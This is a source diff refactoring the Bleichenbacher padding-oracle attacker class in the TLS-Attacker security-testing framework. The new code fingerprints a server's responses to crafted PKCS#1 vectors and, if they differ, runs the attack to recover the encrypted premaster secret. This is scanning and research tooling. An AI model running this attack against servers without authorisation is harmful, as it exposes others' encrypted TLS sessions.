@@ -13,35 +13,34 @@ import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
+import de.rub.nds.tlsattacker.attacks.exception.AttackFailedException;
 import de.rub.nds.tlsattacker.attacks.exception.OracleUnstableException;
 import de.rub.nds.tlsattacker.attacks.padding.VectorResponse;
+import de.rub.nds.tlsattacker.attacks.padding.vector.FingerprintTaskVectorPair;
 import de.rub.nds.tlsattacker.attacks.pkcs1.Bleichenbacher;
-import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherVulnerabilityMap;
 import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherWorkflowGenerator;
-import de.rub.nds.tlsattacker.attacks.pkcs1.BleichenbacherWorkflowType;
 import de.rub.nds.tlsattacker.attacks.pkcs1.Pkcs1Vector;
 import de.rub.nds.tlsattacker.attacks.pkcs1.Pkcs1VectorGenerator;
 import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
+import de.rub.nds.tlsattacker.attacks.task.FingerPrintTask;
 import de.rub.nds.tlsattacker.attacks.util.response.EqualityError;
 import de.rub.nds.tlsattacker.attacks.util.response.EqualityErrorTranslator;
 import de.rub.nds.tlsattacker.attacks.util.response.FingerPrintChecker;
-import de.rub.nds.tlsattacker.attacks.util.response.ResponseExtractor;
 import de.rub.nds.tlsattacker.attacks.util.response.ResponseFingerprint;
 import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.constants.Bits;
+import de.rub.nds.tlsattacker.core.constants.CipherSuite;
 import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
 import de.rub.nds.tlsattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.tlsattacker.core.state.State;
 import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
 import de.rub.nds.tlsattacker.core.workflow.ParallelExecutor;
-import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
-import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
-import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
-import java.io.IOException;
+import de.rub.nds.tlsattacker.core.workflow.task.TlsTask;
 import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
 import java.util.LinkedList;
 import java.util.List;
+import org.apache.logging.log4j.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -53,29 +52,40 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
 
     private static final Logger LOGGER = LogManager.getLogger();
 
-    private BleichenbacherWorkflowType vulnerableType;
+    private final Config tlsConfig;
 
-    private EqualityError errorType;
+    private boolean increasingTimeout = true;
 
-    private boolean shakyScans = false;
+    private long additionalTimeout = 1000;
+
+    private long additionalTcpTimeout = 5000;
+
+    private List<VectorResponse> fullResponseMap;
+
+    private EqualityError resultError;
+
+    private CipherSuite testedSuite;
+
+    private ProtocolVersion testedVersion;
 
     private final ParallelExecutor executor;
 
-    private List<VectorResponse> fingerprintPairList;
-
-    private boolean selfShutdown = false;
+    private boolean shakyScans = false;
+    private boolean erroneousScans = false;
 
     /**
+     *
      * @param bleichenbacherConfig
      * @param baseConfig
      */
     public BleichenbacherAttacker(BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig) {
         super(bleichenbacherConfig, baseConfig);
+        tlsConfig = getTlsConfig();
         executor = new ParallelExecutor(1, 3);
-        selfShutdown = true;
     }
 
     /**
+     *
      * @param bleichenbacherConfig
      * @param baseConfig
      * @param executor
@@ -83,205 +93,148 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     public BleichenbacherAttacker(BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig,
         ParallelExecutor executor) {
         super(bleichenbacherConfig, baseConfig);
+        tlsConfig = getTlsConfig();
         this.executor = executor;
-        selfShutdown = false;
     }
 
     /**
-     * @param  type
-     * @param  encryptedPMS
-     * @return
-     */
-    public State executeTlsFlow(BleichenbacherWorkflowType type, byte[] encryptedPMS) {
-        Config tlsConfig = getTlsConfig();
-        WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, type, encryptedPMS);
-        State state = new State(tlsConfig, trace);
-        tlsConfig.setWorkflowExecutorShouldClose(false);
-        WorkflowExecutor workflowExecutor =
-            WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
-        workflowExecutor.executeWorkflow();
-        return state;
-    }
-
-    /**
+     *
      * @return
      */
     @Override
     public Boolean isVulnerable() {
-        errorType = getEqualityError();
-        if (errorType != null && errorType != EqualityError.NONE) {
-            vulnerableType = config.getWorkflowType();
-            return true;
-        }
-        return false;
-    }
-
-    public EqualityError isVulnerable(List<Pkcs1Vector> pkcs1Vectors, RSAPublicKey publicKey) {
-        fingerprintPairList = getBleichenbacherMap(config.getWorkflowType(), pkcs1Vectors, publicKey);
-        if (fingerprintPairList.isEmpty()) {
-            LOGGER.warn("Could not extract Fingerprints");
+        CONSOLE
+            .info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
+        CONSOLE.info("A server is considered secure if it always responds the same way.");
+        EqualityError referenceError = null;
+        fullResponseMap = new LinkedList<>();
+        try {
+            for (int i = 0; i < config.getNumberOfIterations(); i++) {
+                List<VectorResponse> responseMap = createVectorResponseList();
+                this.fullResponseMap.addAll(responseMap);
+            }
+        } catch (AttackFailedException e) {
+            CONSOLE.info(e.getMessage());
             return null;
         }
-        printBleichenbacherVectormap(fingerprintPairList);
-        EqualityError error = getEqualityError(fingerprintPairList);
-        if (error != EqualityError.NONE) {
-            CONSOLE.info("Found a side channel. Rescanning to confirm.");
-            // Socket Equality Errors can be caused by problems on on the
-            // network. In this case we do a rescan
-            // and check if we find the exact same answer behaviour (twice)
-            List<VectorResponse> secondBleichenbacherVectorMap =
-                getBleichenbacherMap(config.getWorkflowType(), pkcs1Vectors, publicKey);
-            EqualityError error2 = getEqualityError(secondBleichenbacherVectorMap);
-            BleichenbacherVulnerabilityMap mapOne = new BleichenbacherVulnerabilityMap(fingerprintPairList, error);
-            BleichenbacherVulnerabilityMap mapTwo =
-                new BleichenbacherVulnerabilityMap(secondBleichenbacherVectorMap, error2);
-            if (mapOne.looksIdentical(mapTwo)) {
-                List<VectorResponse> thirdBleichenbacherVectorMap =
-                    getBleichenbacherMap(config.getWorkflowType(), pkcs1Vectors, publicKey);
-                EqualityError error3 = getEqualityError(secondBleichenbacherVectorMap);
-                BleichenbacherVulnerabilityMap mapThree =
-                    new BleichenbacherVulnerabilityMap(thirdBleichenbacherVectorMap, error3);
-                if (!mapTwo.looksIdentical(mapThree)) {
-                    LOGGER.debug("The third scan prove this vulnerability to be non existent");
-                    shakyScans = true;
-                    error = EqualityError.NONE;
-                }
-            } else {
-                LOGGER.debug("The second scan prove this vulnerability to be non existent");
-                shakyScans = true;
-                error = EqualityError.NONE;
+        referenceError = getEqualityError(fullResponseMap);
+        if (referenceError != EqualityError.NONE) {
+            CONSOLE.info("Found a behavior difference within the responses. The server could be vulnerable.");
+        } else {
+            CONSOLE
+                .info("Found no behavior difference within the responses. The server is very likely not vulnerable.");
+        }
+
+        CONSOLE.info(EqualityErrorTranslator.translation(referenceError, null, null));
+        if (referenceError != EqualityError.NONE || LOGGER.getLevel().isMoreSpecificThan(Level.INFO)) {
+            LOGGER.debug("-------------(Not Grouped)-----------------");
+            for (VectorResponse vectorResponse : fullResponseMap) {
+                LOGGER.debug(vectorResponse.toString());
             }
         }
-        if (error != EqualityError.NONE) {
-            CONSOLE.info("Found a vulnerability with " + config.getWorkflowType().getDescription());
-        }
-        if (selfShutdown && !config.isExecuteAttack()) {
-            executor.shutdown();
-        }
-        return error;
+
+        resultError = referenceError;
+        return referenceError != EqualityError.NONE;
     }
 
-    public EqualityError getEqualityError() {
-        Config tlsConfig = getTlsConfig();
+    /**
+     *
+     * @return
+     */
+    public List<VectorResponse> createVectorResponseList() {
+        RSAPublicKey publicKey = getServerPublicKey();
+        if (publicKey == null) {
+            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
+            throw new OracleUnstableException("Fatal Extraction error");
+        }
+        List<TlsTask> taskList = new LinkedList<>();
+        List<FingerprintTaskVectorPair> stateVectorPairList = new LinkedList<>();
+        for (Pkcs1Vector vector : Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType(),
+            tlsConfig.getDefaultHighestClientProtocolVersion())) {
+            State state = new State(tlsConfig, BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig,
+                config.getWorkflowType(), vector.getEncryptedValue()));
+            FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
+                executor.getReexecutions(), additionalTcpTimeout);
+            taskList.add(fingerPrintTask);
+            stateVectorPairList.add(new FingerprintTaskVectorPair(fingerPrintTask, vector));
+        }
+        List<VectorResponse> tempResponseVectorList = new LinkedList<>();
+        executor.bulkExecuteTasks(taskList);
+        for (FingerprintTaskVectorPair pair : stateVectorPairList) {
+            ResponseFingerprint fingerprint = null;
+            if (pair.getFingerPrintTask().isHasError()) {
+                erroneousScans = true;
+                LOGGER.warn("Could not extract fingerprint for " + pair.toString());
+            } else {
+                testedSuite = pair.getFingerPrintTask().getState().getTlsContext().getSelectedCipherSuite();
+                testedVersion = pair.getFingerPrintTask().getState().getTlsContext().getSelectedProtocolVersion();
+                if (testedSuite == null || testedVersion == null) {
+                    LOGGER.fatal("Could not find ServerHello after successful extraction");
+                    throw new OracleUnstableException("Fatal Extraction error");
+                }
+                fingerprint = pair.getFingerPrintTask().getFingerprint();
+                tempResponseVectorList.add(new VectorResponse(pair.getVector(), fingerprint));
+            }
+        }
+        // Check that the public key send by the server is actually the public key used to generate the vectors. This is
+        // currently a limitation of our script as the attack vectors are generated statically and not dynamically. We
+        // will adjust this in future versions.
+        for (FingerprintTaskVectorPair pair : stateVectorPairList) {
+            if (pair.getFingerPrintTask().getState().getTlsContext().getServerRsaModulus() != null && !pair
+                .getFingerPrintTask().getState().getTlsContext().getServerRsaModulus().equals(publicKey.getModulus())) {
+                throw new OracleUnstableException(
+                    "Server sent us a different publickey during the scan. Aborting test");
+            }
+        }
+        return tempResponseVectorList;
+    }
+
+    /**
+     * This assumes that the responseVectorList only contains comparable vectors
+     *
+     * @param  responseVectorList
+     * @return
+     */
+    public EqualityError getEqualityError(List<VectorResponse> responseVectorList) {
+
+        for (VectorResponse responseOne : responseVectorList) {
+            for (VectorResponse responseTwo : responseVectorList) {
+                if (responseOne == responseTwo) {
+                    continue;
+                }
+                EqualityError error =
+                    FingerPrintChecker.checkEquality(responseOne.getFingerprint(), responseTwo.getFingerprint());
+                if (error != EqualityError.NONE) {
+                    CONSOLE.info("Found an EqualityError: " + error);
+                    LOGGER.debug("Fingerprint1: " + responseOne.getFingerprint().toString());
+                    LOGGER.debug("Fingerprint2: " + responseTwo.getFingerprint().toString());
+                    return error;
+                }
+
+            }
+        }
+        return EqualityError.NONE;
+    }
+
+    public RSAPublicKey getServerPublicKey() {
         RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
         if (publicKey == null) {
             LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
             return null;
         }
         LOGGER.info("Fetched the following server public key: " + publicKey);
-        List<Pkcs1Vector> pkcs1Vectors = Pkcs1VectorGenerator.generatePkcs1Vectors(publicKey, config.getType(),
-            tlsConfig.getDefaultHighestClientProtocolVersion());
-        // we execute the attack with different protocol flows and
-        // return true as soon as we find the first inconsistency
-        CONSOLE
-            .info("A server is considered vulnerable to this attack if it responds differently to the test vectors.");
-        CONSOLE.info("A server is considered secure if it always responds the same way.");
-        LOGGER.debug("Testing: " + config.getWorkflowType());
-        errorType = isVulnerable(pkcs1Vectors, publicKey);
-        return errorType;
-    }
-
-    /**
-     * @param  bleichenbacherVectorMap
-     * @return
-     */
-    public EqualityError getEqualityError(List<VectorResponse> bleichenbacherVectorMap) {
-        ResponseFingerprint fingerprint = bleichenbacherVectorMap.get(0).getFingerprint();
-        for (VectorResponse pair : bleichenbacherVectorMap) {
-            EqualityError error = FingerPrintChecker.checkEquality(fingerprint, pair.getFingerprint());
-            if (error != EqualityError.NONE) {
-                CONSOLE.info("Found an EqualityError!");
-                CONSOLE.info(EqualityErrorTranslator.translation(error, fingerprint, pair.getFingerprint()));
-                return error;
-            }
-        }
-        return EqualityError.NONE;
-    }
-
-    private void printBleichenbacherVectormap(List<VectorResponse> bleichenbacherVectorMap) {
-        LOGGER.debug("Vectormap:");
-        LOGGER.debug("---------------");
-        for (VectorResponse pair : bleichenbacherVectorMap) {
-            LOGGER.debug(pair);
-        }
-        LOGGER.debug("---------------");
-    }
-
-    private List<VectorResponse> getBleichenbacherMap(BleichenbacherWorkflowType bbWorkflowType,
-        List<Pkcs1Vector> pkcs1Vectors, RSAPublicKey publicKey) {
-        Config tlsConfig = getTlsConfig();
-        tlsConfig.setWorkflowExecutorShouldClose(false);
-        List<VectorResponse> bleichenbacherVectorMap = new LinkedList<>();
-        List<State> stateList = new LinkedList<>();
-        List<StateVectorPair> stateVectorPairList = new LinkedList<>();
-        for (Pkcs1Vector pkcs1Vector : pkcs1Vectors) {
-            WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig, bbWorkflowType,
-                pkcs1Vector.getEncryptedValue());
-            State state = new State(tlsConfig, trace);
-            stateList.add(state);
-            stateVectorPairList.add(new StateVectorPair(state, pkcs1Vector));
-        }
-        executor.bulkExecuteClientStateTasks(stateList);
-        for (StateVectorPair stateVectorPair : stateVectorPairList) {
-            processFinishedStateVectorPair(stateVectorPair, bleichenbacherVectorMap);
-        }
-        // Check that the public key send by the server is actually the public
-        // key used to generate
-        // the vectors. This is currently a limitation of our script as the
-        // attack vectors are
-        // generated statically and not dynamically. We will adjust this in
-        // future versions.
-        for (StateVectorPair pair : stateVectorPairList) {
-            if (pair.getState().getTlsContext().getServerRsaModulus() != null
-                && !pair.getState().getTlsContext().getServerRsaModulus().equals(publicKey.getModulus())) {
-                throw new OracleUnstableException(
-                    "Server sent us a different public key during the scan. Aborting test");
-            }
-        }
-
-        return bleichenbacherVectorMap;
-    }
-
-    private void processFinishedStateVectorPair(StateVectorPair stateVectorPair,
-        List<VectorResponse> bleichenbacherVectorMap) {
-        if (stateVectorPair.getState().getWorkflowTrace().executedAsPlanned()) {
-            ResponseFingerprint fingerprint = ResponseExtractor.getFingerprint(stateVectorPair.getState());
-            bleichenbacherVectorMap.add(new VectorResponse(stateVectorPair.getVector(), fingerprint));
-        } else {
-            LOGGER.warn(
-                "Could not execute Workflow. Something went wrong... Check the debug output for more information");
-        }
-        clearConnections(stateVectorPair.getState());
-
-    }
-
-    private ResponseFingerprint getFingerprint(BleichenbacherWorkflowType type, byte[] encryptedPMS) {
-        State state = executeTlsFlow(type, encryptedPMS);
-        if (state.getWorkflowTrace().allActionsExecuted()) {
-            ResponseFingerprint fingerprint = ResponseExtractor.getFingerprint(state);
-            clearConnections(state);
-            return fingerprint;
-        } else {
-            clearConnections(state);
-            LOGGER.warn(
-                "Could not execute Workflow. Something went wrong... Check the debug output for more information");
-        }
-        return null;
+        return publicKey;
     }
 
     @Override
     public void executeAttack() {
-        // needs to execute the isVulnerable method to configure the workflow
-        // type
-        boolean vulnerable = isVulnerable();
-        LOGGER.info("Using the following oracle type: {}", vulnerableType);
+        LOGGER.info("Using the following oracle type: {}", config.getWorkflowType());
 
-        if (!vulnerable) {
+        if (!isVulnerable()) {
             LOGGER.warn("The server is not vulnerable to the Bleichenbacher attack");
             return;
         }
-        Config tlsConfig = getTlsConfig();
-        RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
+        RSAPublicKey publicKey = getServerPublicKey();
         if (publicKey == null) {
             LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
             return;
@@ -300,51 +253,83 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         }
         RealDirectMessagePkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, getTlsConfig(),
             extractValidFingerprint(publicKey, tlsConfig.getDefaultHighestClientProtocolVersion()), null,
-            vulnerableType);
+            config.getWorkflowType());
         Bleichenbacher attacker = new Bleichenbacher(pms, oracle, config.isMsgPkcsConform());
         attacker.attack();
         BigInteger solution = attacker.getSolution();
         CONSOLE.info(solution.toString(16));
-        if (selfShutdown) {
-            executor.shutdown();
-        }
     }
 
     private ResponseFingerprint extractValidFingerprint(RSAPublicKey publicKey, ProtocolVersion version) {
-        return getFingerprint(vulnerableType,
-            Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, version).getEncryptedValue());
-    }
-
-    /**
-     * @return
-     */
-    public BleichenbacherWorkflowType getVulnerableType() {
-        return vulnerableType;
-    }
-
-    private void clearConnections(State state) {
-        try {
-            state.getTlsContext().getTransportHandler().closeConnection();
-        } catch (IOException ex) {
-            LOGGER.debug(ex);
+        Pkcs1Vector vector = Pkcs1VectorGenerator.generateCorrectPkcs1Vector(publicKey, version);
+        State state = new State(tlsConfig, BleichenbacherWorkflowGenerator.generateWorkflow(tlsConfig,
+            config.getWorkflowType(), vector.getEncryptedValue()));
+        FingerPrintTask fingerPrintTask = new FingerPrintTask(state, additionalTimeout, increasingTimeout,
+            executor.getReexecutions(), additionalTcpTimeout);
+        FingerprintTaskVectorPair stateVectorPair = new FingerprintTaskVectorPair(fingerPrintTask, vector);
+        executor.bulkExecuteTasks(fingerPrintTask);
+        ResponseFingerprint fingerprint = null;
+        if (stateVectorPair.getFingerPrintTask().isHasError()) {
+            LOGGER.warn("Could not extract fingerprint for " + stateVectorPair.toString());
+        } else {
+            testedSuite = stateVectorPair.getFingerPrintTask().getState().getTlsContext().getSelectedCipherSuite();
+            testedVersion =
+                stateVectorPair.getFingerPrintTask().getState().getTlsContext().getSelectedProtocolVersion();
+            if (testedSuite == null || testedVersion == null) {
+                LOGGER.fatal("Could not find ServerHello after successful extraction");
+                throw new OracleUnstableException("Fatal Extraction error");
+            }
+            fingerprint = fingerPrintTask.getFingerprint();
         }
+        return fingerprint;
     }
 
-    /**
-     * @return
-     */
-    public EqualityError getErrorType() {
-        return errorType;
+    public EqualityError getResultError() {
+        return resultError;
     }
 
-    /**
-     * @return
-     */
+    public List<VectorResponse> getResponseMapList() {
+        return fullResponseMap;
+    }
+
+    public CipherSuite getTestedSuite() {
+        return testedSuite;
+    }
+
+    public ProtocolVersion getTestedVersion() {
+        return testedVersion;
+    }
+
     public boolean isShakyScans() {
         return shakyScans;
     }
 
-    public List<VectorResponse> getFingerprintPairList() {
-        return fingerprintPairList;
+    public boolean isErrornousScans() {
+        return erroneousScans;
     }
+
+    public boolean isIncreasingTimeout() {
+        return increasingTimeout;
+    }
+
+    public void setIncreasingTimeout(boolean increasingTimeout) {
+        this.increasingTimeout = increasingTimeout;
+    }
+
+    public long getAdditionalTimeout() {
+        return additionalTimeout;
+    }
+
+    public void setAdditionalTimeout(long additionalTimeout) {
+        this.additionalTimeout = additionalTimeout;
+    }
+
+    public long getAdditionalTcpTimeout() {
+        return additionalTcpTimeout;
+    }
+
+    public void setAdditionalTcpTimeout(long additionalTcpTimeout) {
+        this.additionalTcpTimeout = additionalTcpTimeout;
+    }
+
 }
